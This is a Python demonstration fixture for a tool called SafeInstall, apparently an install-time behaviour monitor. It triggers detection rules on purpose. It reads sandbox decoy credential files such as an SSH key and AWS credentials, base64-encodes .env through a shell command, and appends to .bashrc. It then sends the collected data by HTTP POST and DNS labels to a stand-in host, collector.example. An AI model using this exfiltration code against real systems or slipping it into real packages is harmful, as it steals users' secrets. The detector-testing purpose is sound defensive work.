"""Controlled multi-rule demonstration fixture for SafeInstall.

Exercises 5 of 6 SafeInstall rules cleanly in one run:
- DECOY_READ (reads all 5 sandbox decoy files)
- SUSPICIOUS_EXEC (runs `sh -c "base64 /home/sandbox/.env ..."`)
- OUTSIDE_WRITE (appends a harmless comment to /home/sandbox/.bashrc)
- CANARY_EXFIL (HTTP POST base64 + DNS label hex exfil)
- UNKNOWN_NET (outbound HTTP + DNS to non-allowlisted collector.example)
"""

import base64
import os
import socket
import subprocess
from pathlib import Path
from urllib.error import URLError
from urllib.request import Request, urlopen


DECOY_PATHS = (
    Path("/home/sandbox/.env"),
    Path("/home/sandbox/.ssh/id_rsa"),
    Path("/home/sandbox/.aws/credentials"),
    Path("/home/sandbox/.git-credentials"),
    Path("/home/sandbox/.pypirc"),
)
BASHRC_PATH = Path("/home/sandbox/.bashrc")
DEFAULT_SINK_URL = "http://collector.example/upload"


def _read_decoys(paths: tuple[Path, ...] = DECOY_PATHS) -> list[bytes]:
    chunks: list[bytes] = []
    for path in paths:
        if path.is_file():
            chunks.append(path.read_bytes())
    return chunks


def _run_suspicious_exec() -> None:
    subprocess.run(
        ["sh", "-c", "base64 /home/sandbox/.env >/dev/null 2>&1"],
        check=False,
    )


def _write_outside_workspace() -> None:
    try:
        BASHRC_PATH.parent.mkdir(parents=True, exist_ok=True)
        with BASHRC_PATH.open("a", encoding="utf-8") as fh:
            fh.write("# safeinstall-demo-outside-write\n")
    except OSError:
        pass


def _send_dns_exfil(chunks: list[bytes]) -> None:
    if not chunks:
        return
    # Extract a canary token if present in .env (e.g. SAFEINSTALL_CANARY=...)
    token = chunks[0].decode("utf-8", "ignore").strip().splitlines()[0]
    if "=" in token:
        token = token.split("=", 1)[1].strip()
    label = token.encode("utf-8").hex()[:48] or "64656d6f"
    try:
        socket.gethostbyname(f"{label}.exfil.collector.example")
    except OSError:
        pass


def _send_http_exfil(chunks: list[bytes], url: str = DEFAULT_SINK_URL) -> None:
    if not chunks:
        return
    payload = base64.b64encode(b"\n".join(chunks))
    request = Request(
        url,
        data=payload,
        headers={"Content-Type": "application/octet-stream"},
        method="POST",
    )
    try:
        with urlopen(request, timeout=5):
            pass
    except (TimeoutError, URLError):
        pass


def trigger() -> None:
    """Execute all 5 harmless demonstration behaviors."""
    chunks = _read_decoys()
    _run_suspicious_exec()
    _write_outside_workspace()
    _send_dns_exfil(chunks)
    _send_http_exfil(
        chunks,
        os.environ.get("SAFEINSTALL_DEMO_SINK_URL", DEFAULT_SINK_URL),
    )


trigger()
